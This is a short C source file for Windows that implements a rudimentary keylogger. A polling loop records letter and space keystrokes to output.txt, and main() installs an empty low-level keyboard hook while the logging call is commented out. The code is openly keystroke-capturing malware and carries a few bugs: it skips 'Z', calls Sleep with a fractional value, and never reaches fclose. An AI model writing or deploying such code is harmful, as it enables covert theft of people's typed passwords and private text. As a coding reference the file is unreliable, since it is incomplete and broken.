#include <windows.h>
#include <stdio.h>
#include "logger.h"

LRESULT CALLBACK LowLevelKeyboardProc(
  _In_ int    nCode,
  _In_ WPARAM wParam,
  _In_ LPARAM lParam
)
{
    // process event
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

char keylog()
{
    FILE *fp = fopen("output.txt", "a");
    while (1)
    {
        for (short i = 0x41; i < 0x5A; i++)
        {
            if (GetAsyncKeyState(i) < 0)
            {
                char c = i;
                printf("%c", c);
                fputc(c, fp);
                while(GetKeyState(i) < 0)
                {
                    Sleep(0.1);
                }
            }
        }
        if (GetAsyncKeyState(VK_SPACE))
        {
            printf("%c", ' ');
            fputc(' ', fp);
            while(GetKeyState(VK_SPACE) < 0)
            {
                Sleep(0.1);
            }
        }
    }
    fclose(fp);
}

int main(void)
{
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    //keylog();
    return 0;
}